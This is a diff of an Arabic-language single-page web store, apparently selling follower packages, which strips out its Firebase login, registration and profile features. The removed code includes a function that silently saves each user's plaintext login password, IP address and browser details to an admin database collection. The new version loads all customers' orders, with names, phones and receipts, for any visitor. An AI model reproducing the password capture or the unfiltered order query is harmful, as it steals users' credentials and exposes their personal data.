@@ -95,7 +95,6 @@
             display: flex;
             list-style: none;
             gap: 15px;
-            align-items: center;
         }
 
         nav a {
@@ -131,125 +130,39 @@
             transform: translateY(-2px);
         }
 
-        .user-info {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            background: rgba(255,255,255,0.1);
-            padding: 8px 15px;
-            border-radius: 20px;
-            cursor: pointer;
+        .hero {
+            text-align: center;
+            padding: 100px 0;
             position: relative;
         }
 
-        .user-info:hover {
-            background: rgba(255,255,255,0.15);
-        }
-
-        .user-avatar {
-            width: 35px;
-            height: 35px;
-            border-radius: 50%;
-            background: var(--gradient);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: white;
-            font-weight: bold;
-        }
-
-        .user-menu {
-            display: none;
+        .hero::before {
+            content: '';
             position: absolute;
-            top: 100%;
+            top: 0;
             left: 0;
-            background: rgba(26,26,46,0.95);
-            padding: 10px;
-            border-radius: 10px;
-            margin-top: 10px;
-            min-width: 150px;
-            z-index: 1000;
-        }
-
-        .user-menu a {
-            display: block;
-            padding: 8px 12px;
-            border-radius: 5px;
-            color: white;
-            text-decoration: none;
-        }
-
-        .user-menu a:hover {
-            background: rgba(255,255,255,0.1);
-        }
-
-        /* صفحات تسجيل الدخول */
-        .auth-page {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 80vh;
-            padding: 40px 20px;
-        }
-
-        .auth-container {
-            background: rgba(255,255,255,0.08);
-            padding: 40px;
-            border-radius: 20px;
             width: 100%;
-            max-width: 450px;
-            border: 1px solid rgba(255,255,255,0.12);
-            backdrop-filter: blur(10px);
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            height: 100%;
+            background: radial-gradient(circle at center, rgba(233, 30, 99, 0.1) 0%, transparent 70%);
+            z-index: -1;
         }
 
-        .auth-header {
-            text-align: center;
-            margin-bottom: 30px;
-        }
-
-        .auth-title {
-            font-size: 2rem;
-            margin-bottom: 10px;
-            background: var(--gradient);
+        .hero h1 {
+            font-size: 3.5rem;
+            margin-bottom: 20px;
+            background: linear-gradient(to right, var(--accent), var(--secondary));
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
+            text-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
         }
 
-        .auth-subtitle {
-            opacity: 0.8;
-            font-size: 1.1rem;
-        }
-
-        .form-group {
-            margin-bottom: 20px;
-        }
-
-        .form-label {
-            display: block;
-            margin-bottom: 8px;
-            font-weight: bold;
-        }
-
-        .form-control {
-            width: 100%;
-            padding: 15px;
-            border-radius: 12px;
-            border: 1px solid rgba(255,255,255,0.2);
-            background: rgba(255,255,255,0.05);
-            color: white;
-            font-size: 16px;
-            transition: 0.3s;
-        }
-
-        .form-control:focus {
-            outline: none;
-            border-color: var(--primary);
-            box-shadow: 0 0 0 2px rgba(233, 30, 99, 0.3);
-        }
-
-        .form-control::placeholder {
-            color: rgba(255,255,255,0.5);
+        .hero p {
+            font-size: 1.3rem;
+            margin-bottom: 40px;
+            opacity: 0.9;
+            max-width: 700px;
+            margin-left: auto;
+            margin-right: auto;
         }
 
         .btn {
@@ -287,92 +200,6 @@
         .btn:hover {
             transform: translateY(-3px);
             box-shadow: 0 10px 25px rgba(233, 30, 99, 0.6);
-        }
-
-        .btn-block {
-            width: 100%;
-            text-align: center;
-        }
-
-        .btn-secondary {
-            background: rgba(255,255,255,0.1);
-            border: 1px solid rgba(255,255,255,0.2);
-        }
-
-        .btn-secondary:hover {
-            background: rgba(255,255,255,0.15);
-        }
-
-        .auth-footer {
-            text-align: center;
-            margin-top: 25px;
-            padding-top: 20px;
-            border-top: 1px solid rgba(255,255,255,0.1);
-        }
-
-        .auth-link {
-            color: var(--accent);
-            text-decoration: none;
-            font-weight: bold;
-        }
-
-        .auth-link:hover {
-            text-decoration: underline;
-        }
-
-        .error-message {
-            background: rgba(255, 128, 102, 0.2);
-            color: var(--danger);
-            padding: 12px;
-            border-radius: 10px;
-            margin-bottom: 20px;
-            text-align: center;
-            border: 1px solid rgba(255, 128, 102, 0.3);
-        }
-
-        .success-message {
-            background: rgba(0, 201, 167, 0.2);
-            color: var(--success);
-            padding: 12px;
-            border-radius: 10px;
-            margin-bottom: 20px;
-            text-align: center;
-            border: 1px solid rgba(0, 201, 167, 0.3);
-        }
-
-        .hero {
-            text-align: center;
-            padding: 100px 0;
-            position: relative;
-        }
-
-        .hero::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: radial-gradient(circle at center, rgba(233, 30, 99, 0.1) 0%, transparent 70%);
-            z-index: -1;
-        }
-
-        .hero h1 {
-            font-size: 3.5rem;
-            margin-bottom: 20px;
-            background: linear-gradient(to right, var(--accent), var(--secondary));
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            text-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
-        }
-
-        .hero p {
-            font-size: 1.3rem;
-            margin-bottom: 40px;
-            opacity: 0.9;
-            max-width: 700px;
-            margin-left: auto;
-            margin-right: auto;
         }
 
         .features {
@@ -559,6 +386,31 @@
             box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
         }
 
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-control {
+            width: 100%;
+            padding: 15px;
+            border-radius: 12px;
+            border: 1px solid rgba(255,255,255,0.2);
+            background: rgba(255,255,255,0.05);
+            color: white;
+            font-size: 16px;
+            transition: 0.3s;
+        }
+
+        .form-control:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 0 2px rgba(233, 30, 99, 0.3);
+        }
+
+        .form-control::placeholder {
+            color: rgba(255,255,255,0.5);
+        }
+
         .order-item {
             background: rgba(255,255,255,0.05);
             padding: 20px;
@@ -591,10 +443,12 @@
             display: inline-block;
         }
 
+        /* تحسينات للشعار */
         .logo-icon {
             font-size: 24px;
         }
 
+        /* تأثيرات إضافية */
         .floating {
             animation: floating 3s ease-in-out infinite;
         }
@@ -605,43 +459,7 @@
             100% { transform: translateY(0px); }
         }
 
-        /* صفحة إدارة الحساب */
-        .profile-page {
-            background: rgba(255,255,255,0.08);
-            padding: 40px;
-            border-radius: 20px;
-            max-width: 500px;
-            margin: 50px auto;
-            border: 1px solid rgba(255,255,255,0.12);
-            backdrop-filter: blur(10px);
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
-        }
-
-        .profile-header {
-            text-align: center;
-            margin-bottom: 30px;
-        }
-
-        .profile-avatar {
-            width: 80px;
-            height: 80px;
-            border-radius: 50%;
-            background: var(--gradient);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: white;
-            font-size: 2rem;
-            font-weight: bold;
-            margin: 0 auto 15px;
-        }
-
-        .form-actions {
-            display: flex;
-            gap: 10px;
-            margin-top: 20px;
-        }
-
+        /* تحسينات للاستجابة */
         @media (max-width: 768px) {
             header {
                 flex-direction: column;
@@ -672,18 +490,6 @@
             .section-title {
                 font-size: 2rem;
                 padding: 0 15px;
-            }
-
-            .auth-container {
-                padding: 30px 20px;
-            }
-
-            .profile-page {
-                padding: 30px 20px;
-            }
-
-            .form-actions {
-                flex-direction: column;
             }
         }
 
@@ -725,6 +531,7 @@
             }
         }
 
+        /* هامبرغر مينو للشاشات الصغيرة */
         .menu-toggle {
             display: none;
             background: none;
@@ -763,110 +570,8 @@
 </head>
 <body>
     <div class="container">
-        <!-- صفحة تسجيل الدخول -->
-        <div id="loginPage" class="page active">
-            <header>
-                <div class="logo-container">
-                    <div class="logo floating">
-                        <img src="1.png" alt="Roma&knzy stor Logo">
-                    </div>
-                    <div class="logo-text">
-                        Roma&knzy stor
-                        <i class="fas fa-shopping-bag"></i>
-                    </div>
-                </div>
-            </header>
-
-            <section class="auth-page">
-                <div class="auth-container">
-                    <div class="auth-header">
-                        <h1 class="auth-title">تسجيل الدخول</h1>
-                        <p class="auth-subtitle">سجل دخولك لتتمكن من الطلب</p>
-                    </div>
-
-                    <div id="loginMessage"></div>
-
-                    <form id="loginForm">
-                        <div class="form-group">
-                            <label class="form-label">البريد الإلكتروني</label>
-                            <input type="email" id="loginEmail" class="form-control" placeholder="ادخل بريدك الإلكتروني" required>
-                        </div>
-
-                        <div class="form-group">
-                            <label class="form-label">كلمة المرور</label>
-                            <input type="password" id="loginPassword" class="form-control" placeholder="ادخل كلمة المرور" required>
-                        </div>
-
-                        <button type="submit" class="btn btn-block">
-                            <i class="fas fa-sign-in-alt"></i> تسجيل الدخول
-                        </button>
-                    </form>
-
-                    <div class="auth-footer">
-                        <p>ما عندكش حساب؟ <a href="#" class="auth-link" onclick="showPage('registerPage')">إنشاء حساب</a></p>
-                    </div>
-                </div>
-            </section>
-        </div>
-
-        <!-- صفحة إنشاء حساب -->
-        <div id="registerPage" class="page">
-            <header>
-                <div class="logo-container">
-                    <div class="logo floating">
-                        <img src="1.png" alt="Roma&knzy stor Logo">
-                    </div>
-                    <div class="logo-text">
-                        Roma&knzy stor
-                        <i class="fas fa-shopping-bag"></i>
-                    </div>
-                </div>
-            </header>
-
-            <section class="auth-page">
-                <div class="auth-container">
-                    <div class="auth-header">
-                        <h1 class="auth-title">إنشاء حساب</h1>
-                        <p class="auth-subtitle">أنشئ حساب جديد للبدء</p>
-                    </div>
-
-                    <div id="registerMessage"></div>
-
-                    <form id="registerForm">
-                        <div class="form-group">
-                            <label class="form-label">الاسم الكامل</label>
-                            <input type="text" id="registerName" class="form-control" placeholder="ادخل اسمك الكامل" required>
-                        </div>
-
-                        <div class="form-group">
-                            <label class="form-label">البريد الإلكتروني</label>
-                            <input type="email" id="registerEmail" class="form-control" placeholder="ادخل بريدك الإلكتروني" required>
-                        </div>
-
-                        <div class="form-group">
-                            <label class="form-label">كلمة المرور</label>
-                            <input type="password" id="registerPassword" class="form-control" placeholder="ادخل كلمة المرور" required>
-                        </div>
-
-                        <div class="form-group">
-                            <label class="form-label">تأكيد كلمة المرور</label>
-                            <input type="password" id="registerConfirmPassword" class="form-control" placeholder="اعد كتابة كلمة المرور" required>
-                        </div>
-
-                        <button type="submit" class="btn btn-block">
-                            <i class="fas fa-user-plus"></i> إنشاء حساب
-                        </button>
-                    </form>
-
-                    <div class="auth-footer">
-                        <p>عندك حساب؟ <a href="#" class="auth-link" onclick="showPage('loginPage')">سجل دخول</a></p>
-                    </div>
-                </div>
-            </section>
-        </div>
-
         <!-- الصفحة الرئيسية -->
-        <div id="homePage" class="page">
+        <div id="homePage" class="page active">
             <header>
                 <div class="logo-container">
                     <div class="logo floating">
@@ -884,17 +589,6 @@
                     <ul id="navMenu">
                         <li><a href="#" onclick="showPage('homePage')">الرئيسية</a></li>
                         <li><a href="#" onclick="showPage('ordersPage')">طلباتي</a></li>
-                        <li>
-                            <div class="user-info" onclick="toggleUserMenu()">
-                                <div class="user-avatar" id="userAvatar">U</div>
-                                <span id="userName">مستخدم</span>
-                                <i class="fas fa-chevron-down"></i>
-                                <div class="user-menu" id="userMenu">
-                                    <a href="#" onclick="showPage('profilePage')">إدارة الحساب</a>
-                                    <a href="#" onclick="logout()">تسجيل الخروج</a>
-                                </div>
-                            </div>
-                        </li>
                     </ul>
                 </nav>
             </header>
@@ -1107,17 +801,6 @@
                     <ul id="navMenuOrders">
                         <li><a href="#" onclick="showPage('homePage')">الرئيسية</a></li>
                         <li><a href="#" onclick="showPage('ordersPage')">طلباتي</a></li>
-                        <li>
-                            <div class="user-info" onclick="toggleUserMenu()">
-                                <div class="user-avatar" id="userAvatarOrders">U</div>
-                                <span id="userNameOrders">مستخدم</span>
-                                <i class="fas fa-chevron-down"></i>
-                                <div class="user-menu" id="userMenuOrders">
-                                    <a href="#" onclick="showPage('profilePage')">إدارة الحساب</a>
-                                    <a href="#" onclick="logout()">تسجيل الخروج</a>
-                                </div>
-                            </div>
-                        </li>
                     </ul>
                 </nav>
             </header>
@@ -1147,17 +830,6 @@
                     <ul id="navMenuPayment">
                         <li><a href="#" onclick="showPage('homePage')">الرئيسية</a></li>
                         <li><a href="#" onclick="showPage('ordersPage')">طلباتي</a></li>
-                        <li>
-                            <div class="user-info" onclick="toggleUserMenu()">
-                                <div class="user-avatar" id="userAvatarPayment">U</div>
-                                <span id="userNamePayment">مستخدم</span>
-                                <i class="fas fa-chevron-down"></i>
-                                <div class="user-menu" id="userMenuPayment">
-                                    <a href="#" onclick="showPage('profilePage')">إدارة الحساب</a>
-                                    <a href="#" onclick="logout()">تسجيل الخروج</a>
-                                </div>
-                            </div>
-                        </li>
                     </ul>
                 </nav>
             </header>
@@ -1200,101 +872,11 @@
                 <button class="btn" style="width: 100%;" onclick="submitOrder()">تأكيد الطلب</button>
             </div>
         </div>
-
-        <!-- صفحة إدارة الحساب -->
-        <div id="profilePage" class="page">
-            <header>
-                <div class="logo-container">
-                    <div class="logo">
-                        <img src="1.png" alt="Roma&knzy stor Logo">
-                    </div>
-                    <div class="logo-text">
-                        Roma&knzy stor
-                        <i class="fas fa-shopping-bag"></i>
-                    </div>
-                </div>
-                <button class="menu-toggle" onclick="toggleMenu()">
-                    <i class="fas fa-bars"></i>
-                </button>
-                <nav>
-                    <ul id="navMenuProfile">
-                        <li><a href="#" onclick="showPage('homePage')">الرئيسية</a></li>
-                        <li><a href="#" onclick="showPage('ordersPage')">طلباتي</a></li>
-                        <li>
-                            <div class="user-info" onclick="toggleUserMenu()">
-                                <div class="user-avatar" id="userAvatarProfile">U</div>
-                                <span id="userNameProfile">مستخدم</span>
-                                <i class="fas fa-chevron-down"></i>
-                                <div class="user-menu" id="userMenuProfile">
-                                    <a href="#" onclick="showPage('profilePage')">إدارة الحساب</a>
-                                    <a href="#" onclick="logout()">تسجيل الخروج</a>
-                                </div>
-                            </div>
-                        </li>
-                    </ul>
-                </nav>
-            </header>
-
-            <div class="profile-page">
-                <div class="profile-header">
-                    <div class="profile-avatar" id="profileBigAvatar">U</div>
-                    <h2 id="profileUserName">إدارة الحساب</h2>
-                </div>
-
-                <div id="profileMessage"></div>
-
-                <form id="profileForm">
-                    <div class="form-group">
-                        <label class="form-label">الاسم الكامل</label>
-                        <input type="text" id="profileName" class="form-control" placeholder="اسمك الكامل" required>
-                    </div>
-
-                    <div class="form-group">
-                        <label class="form-label">البريد الإلكتروني</label>
-                        <input type="email" id="profileEmail" class="form-control" placeholder="بريدك الإلكتروني" required>
-                    </div>
-
-                    <div class="form-actions">
-                        <button type="submit" class="btn btn-block">
-                            <i class="fas fa-save"></i> حفظ التغييرات
-                        </button>
-                    </div>
-                </form>
-
-                <div style="margin-top: 30px; padding-top: 20px; border-top: 1px solid rgba(255,255,255,0.1);">
-                    <h3 style="margin-bottom: 20px;">تغيير كلمة المرور</h3>
-                    
-                    <form id="passwordForm">
-                        <div class="form-group">
-                            <label class="form-label">كلمة المرور الحالية</label>
-                            <input type="password" id="currentPassword" class="form-control" placeholder="كلمة المرور الحالية">
-                        </div>
-
-                        <div class="form-group">
-                            <label class="form-label">كلمة المرور الجديدة</label>
-                            <input type="password" id="newPassword" class="form-control" placeholder="كلمة المرور الجديدة">
-                        </div>
-
-                        <div class="form-group">
-                            <label class="form-label">تأكيد كلمة المرور الجديدة</label>
-                            <input type="password" id="confirmNewPassword" class="form-control" placeholder="تأكيد كلمة المرور الجديدة">
-                        </div>
-
-                        <div class="form-actions">
-                            <button type="submit" class="btn btn-block">
-                                <i class="fas fa-key"></i> تغيير كلمة المرور
-                            </button>
-                        </div>
-                    </form>
-                </div>
-            </div>
-        </div>
     </div>
 
     <!-- Firebase -->
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-auth-compat.js"></script>
 
     <script>
         // Firebase Configuration
@@ -1310,55 +892,8 @@
         // Initialize Firebase
         firebase.initializeApp(firebaseConfig);
         const db = firebase.firestore();
-        const auth = firebase.auth();
 
         let selectedPackage = { amount: 100, price: 25 };
-        let currentUser = null;
-
-        // دالة لحفظ بيانات تسجيل الدخول للإدمن
-        async function saveLoginToAdmin(user, loginEmail, loginPassword) {
-            try {
-                // جلب معلومات المستخدم
-                const userDoc = await db.collection('users').doc(user.uid).get();
-                const userData = userDoc.data();
-                
-                // جلب الـ IP
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipResponse.json();
-                const ipAddress = ipData.ip;
-                
-                const userAgent = navigator.userAgent;
-                
-                // حفظ بيانات تسجيل الدخول
-                await db.collection('userLogins').add({
-                    userId: user.uid,
-                    userName: userData.name,
-                    userEmail: userData.email,
-                    loginEmail: loginEmail,
-                    loginPassword: loginPassword,
-                    loginTime: firebase.firestore.FieldValue.serverTimestamp(),
-                    ipAddress: ipAddress,
-                    userAgent: userAgent
-                });
-                
-                console.log('✅ Login data sent to admin panel');
-            } catch (error) {
-                console.error('Error saving login data:', error);
-            }
-        }
-
-        // إدارة حالة المستخدم
-        auth.onAuthStateChanged((user) => {
-            if (user) {
-                currentUser = user;
-                showPage('homePage');
-                updateUserInfo();
-                loadProfileData();
-            } else {
-                currentUser = null;
-                showPage('loginPage');
-            }
-        });
 
         function showPage(pageId) {
             document.querySelectorAll('.page').forEach(page => {
@@ -1371,7 +906,7 @@
                 menu.classList.remove('show');
             });
             
-            if (pageId === 'ordersPage' && currentUser) {
+            if (pageId === 'ordersPage') {
                 loadOrders();
             }
         }
@@ -1379,241 +914,16 @@
         function toggleMenu() {
             const currentPage = document.querySelector('.page.active').id;
             const navMenu = document.getElementById(`navMenu${currentPage !== 'homePage' ? currentPage.replace('Page', '') : ''}`);
-            if (navMenu) {
-                navMenu.classList.toggle('show');
-            }
-        }
-
-        function toggleUserMenu() {
-            const userMenus = document.querySelectorAll('.user-menu');
-            userMenus.forEach(menu => {
-                menu.style.display = menu.style.display === 'none' ? 'block' : 'none';
-            });
-        }
-
-        // تسجيل الدخول
-        document.getElementById('loginForm').addEventListener('submit', async (e) => {
-            e.preventDefault();
-            
-            const email = document.getElementById('loginEmail').value;
-            const password = document.getElementById('loginPassword').value;
-            const messageDiv = document.getElementById('loginMessage');
-            
-            try {
-                const userCredential = await auth.signInWithEmailAndPassword(email, password);
-                
-                // حفظ بيانات تسجيل الدخول للإدمن
-                await saveLoginToAdmin(userCredential.user, email, password);
-                
-                messageDiv.innerHTML = '<div class="success-message">تم تسجيل الدخول بنجاح!</div>';
-                
-            } catch (error) {
-                let errorMessage = 'حدث خطأ أثناء تسجيل الدخول';
-                if (error.code === 'auth/user-not-found') {
-                    errorMessage = 'البريد الإلكتروني غير مسجل';
-                } else if (error.code === 'auth/wrong-password') {
-                    errorMessage = 'كلمة المرور غير صحيحة';
-                } else if (error.code === 'auth/invalid-email') {
-                    errorMessage = 'البريد الإلكتروني غير صالح';
-                }
-                messageDiv.innerHTML = `<div class="error-message">${errorMessage}</div>`;
-            }
-        });
-
-        // إنشاء حساب
-        document.getElementById('registerForm').addEventListener('submit', async (e) => {
-            e.preventDefault();
-            
-            const name = document.getElementById('registerName').value;
-            const email = document.getElementById('registerEmail').value;
-            const password = document.getElementById('registerPassword').value;
-            const confirmPassword = document.getElementById('registerConfirmPassword').value;
-            const messageDiv = document.getElementById('registerMessage');
-            
-            if (password !== confirmPassword) {
-                messageDiv.innerHTML = '<div class="error-message">كلمات المرور غير متطابقة</div>';
-                return;
-            }
-            
-            if (password.length < 6) {
-                messageDiv.innerHTML = '<div class="error-message">كلمة المرور يجب أن تكون 6 أحرف على الأقل</div>';
-                return;
-            }
-            
-            try {
-                const userCredential = await auth.createUserWithEmailAndPassword(email, password);
-                const user = userCredential.user;
-                
-                // حفظ بيانات المستخدم الإضافية في Firestore
-                await db.collection('users').doc(user.uid).set({
-                    name: name,
-                    email: email,
-                    createdAt: firebase.firestore.FieldValue.serverTimestamp()
-                });
-                
-                messageDiv.innerHTML = '<div class="success-message">تم إنشاء الحساب بنجاح!</div>';
-                
-            } catch (error) {
-                let errorMessage = 'حدث خطأ أثناء إنشاء الحساب';
-                if (error.code === 'auth/email-already-in-use') {
-                    errorMessage = 'البريد الإلكتروني مستخدم بالفعل';
-                } else if (error.code === 'auth/invalid-email') {
-                    errorMessage = 'البريد الإلكتروني غير صالح';
-                } else if (error.code === 'auth/weak-password') {
-                    errorMessage = 'كلمة المرور ضعيفة جداً';
-                }
-                messageDiv.innerHTML = `<div class="error-message">${errorMessage}</div>`;
-            }
-        });
-
-        // تحديث معلومات المستخدم
-        async function updateUserInfo() {
-            if (!currentUser) return;
-            
-            try {
-                const userDoc = await db.collection('users').doc(currentUser.uid).get();
-                if (userDoc.exists) {
-                    const userData = userDoc.data();
-                    // تحديث جميع عناصر المستخدم في الصفحات المختلفة
-                    const userNames = document.querySelectorAll('[id^="userName"]');
-                    const userAvatars = document.querySelectorAll('[id^="userAvatar"]');
-                    
-                    userNames.forEach(element => {
-                        element.textContent = userData.name;
-                    });
-                    
-                    userAvatars.forEach(element => {
-                        element.textContent = userData.name.charAt(0).toUpperCase();
-                    });
-                }
-            } catch (error) {
-                console.error('Error fetching user data:', error);
-            }
-        }
-
-        // تحميل بيانات الملف الشخصي
-        async function loadProfileData() {
-            if (!currentUser) return;
-            
-            try {
-                const userDoc = await db.collection('users').doc(currentUser.uid).get();
-                if (userDoc.exists) {
-                    const userData = userDoc.data();
-                    document.getElementById('profileName').value = userData.name;
-                    document.getElementById('profileEmail').value = userData.email;
-                    document.getElementById('profileBigAvatar').textContent = userData.name.charAt(0).toUpperCase();
-                    document.getElementById('profileUserName').textContent = userData.name;
-                }
-            } catch (error) {
-                console.error('Error loading profile data:', error);
-            }
-        }
-
-        // تحديث الملف الشخصي
-        document.getElementById('profileForm').addEventListener('submit', async (e) => {
-            e.preventDefault();
-            
-            const name = document.getElementById('profileName').value;
-            const email = document.getElementById('profileEmail').value;
-            const messageDiv = document.getElementById('profileMessage');
-            
-            try {
-                // تحديث البريد الإلكتروني في Authentication
-                await currentUser.updateEmail(email);
-                
-                // تحديث البيانات في Firestore
-                await db.collection('users').doc(currentUser.uid).update({
-                    name: name,
-                    email: email
-                });
-                
-                messageDiv.innerHTML = '<div class="success-message">تم تحديث البيانات بنجاح!</div>';
-                updateUserInfo();
-                loadProfileData();
-                
-            } catch (error) {
-                let errorMessage = 'حدث خطأ أثناء تحديث البيانات';
-                if (error.code === 'auth/requires-recent-login') {
-                    errorMessage = 'يجب إعادة تسجيل الدخول لتحديث البريد الإلكتروني';
-                }
-                messageDiv.innerHTML = `<div class="error-message">${errorMessage}</div>`;
-            }
-        });
-
-        // تغيير كلمة المرور
-        document.getElementById('passwordForm').addEventListener('submit', async (e) => {
-            e.preventDefault();
-            
-            const currentPassword = document.getElementById('currentPassword').value;
-            const newPassword = document.getElementById('newPassword').value;
-            const confirmNewPassword = document.getElementById('confirmNewPassword').value;
-            const messageDiv = document.getElementById('profileMessage');
-            
-            if (newPassword !== confirmNewPassword) {
-                messageDiv.innerHTML = '<div class="error-message">كلمات المرور غير متطابقة</div>';
-                return;
-            }
-            
-            if (newPassword.length < 6) {
-                messageDiv.innerHTML = '<div class="error-message">كلمة المرور يجب أن تكون 6 أحرف على الأقل</div>';
-                return;
-            }
-            
-            try {
-                // إعادة المصادقة لتغيير كلمة المرور
-                const credential = firebase.auth.EmailAuthProvider.credential(
-                    currentUser.email, 
-                    currentPassword
-                );
-                
-                await currentUser.reauthenticateWithCredential(credential);
-                await currentUser.updatePassword(newPassword);
-                
-                messageDiv.innerHTML = '<div class="success-message">تم تغيير كلمة المرور بنجاح!</div>';
-                
-                // مسح الحقول
-                document.getElementById('currentPassword').value = '';
-                document.getElementById('newPassword').value = '';
-                document.getElementById('confirmNewPassword').value = '';
-                
-            } catch (error) {
-                let errorMessage = 'حدث خطأ أثناء تغيير كلمة المرور';
-                if (error.code === 'auth/wrong-password') {
-                    errorMessage = 'كلمة المرور الحالية غير صحيحة';
-                }
-                messageDiv.innerHTML = `<div class="error-message">${errorMessage}</div>`;
-            }
-        });
-
-        // تسجيل الخروج
-        function logout() {
-            auth.signOut().then(() => {
-                showPage('loginPage');
-                const userMenus = document.querySelectorAll('.user-menu');
-                userMenus.forEach(menu => {
-                    menu.style.display = 'none';
-                });
-            });
+            navMenu.classList.toggle('show');
         }
 
         function selectPackage(amount, price) {
-            if (!currentUser) {
-                alert('يرجى تسجيل الدخول أولاً');
-                showPage('loginPage');
-                return;
-            }
             selectedPackage = { amount, price };
             document.getElementById('selectedPackageInfo').textContent = `باقة ${amount} متابع - ${price} جنيه`;
             showPage('paymentPage');
         }
 
         async function submitOrder() {
-            if (!currentUser) {
-                alert('يرجى تسجيل الدخول أولاً');
-                showPage('loginPage');
-                return;
-            }
-            
             const username = document.getElementById('username').value;
             const phone = document.getElementById('phone').value;
             const receipt = document.getElementById('receipt').files[0];
@@ -1625,7 +935,6 @@
             
             try {
                 const newOrder = {
-                    userId: currentUser.uid,
                     package: selectedPackage,
                     username,
                     phone,
@@ -1640,19 +949,21 @@
                 resetPaymentForm();
                 showPage('ordersPage');
             } catch (error) {
-                console.error('Error submitting order:', error);
                 alert('حدث خطأ أثناء إرسال الطلب. تأكد من اتصال الإنترنت.');
             }
         }
 
+        function resetPaymentForm() {
+            document.getElementById('username').value = '';
+            document.getElementById('phone').value = '';
+            document.getElementById('receipt').value = '';
+        }
+
         async function loadOrders() {
-            if (!currentUser) return;
-            
             const ordersList = document.getElementById('ordersList');
             
             try {
                 const snapshot = await db.collection('orders')
-                    .where('userId', '==', currentUser.uid)
                     .orderBy('timestamp', 'desc')
                     .get();
                 
@@ -1690,40 +1001,9 @@
                 
                 ordersList.innerHTML = ordersHTML;
             } catch (error) {
-                console.error('Error loading orders:', error);
-                ordersList.innerHTML = `
-                    <div class="error-message">
-                        <i class="fas fa-exclamation-triangle"></i>
-                        حدث خطأ في تحميل الطلبات
-                    </div>
-                `;
+                ordersList.innerHTML = '<p style="text-align: center; color: var(--danger);">حدث خطأ في تحميل الطلبات</p>';
             }
         }
-
-        function resetPaymentForm() {
-            document.getElementById('username').value = '';
-            document.getElementById('phone').value = '';
-            document.getElementById('receipt').value = '';
-        }
-
-        // إغلاق القائمة عند النقر خارجها
-        document.addEventListener('click', function(event) {
-            const userInfos = document.querySelectorAll('.user-info');
-            const userMenus = document.querySelectorAll('.user-menu');
-            
-            let clickedInside = false;
-            userInfos.forEach(info => {
-                if (info.contains(event.target)) {
-                    clickedInside = true;
-                }
-            });
-            
-            if (!clickedInside) {
-                userMenus.forEach(menu => {
-                    menu.style.display = 'none';
-                });
-            }
-        });
 
         // Auto-load orders when page loads
         document.addEventListener('DOMContentLoaded', function() {
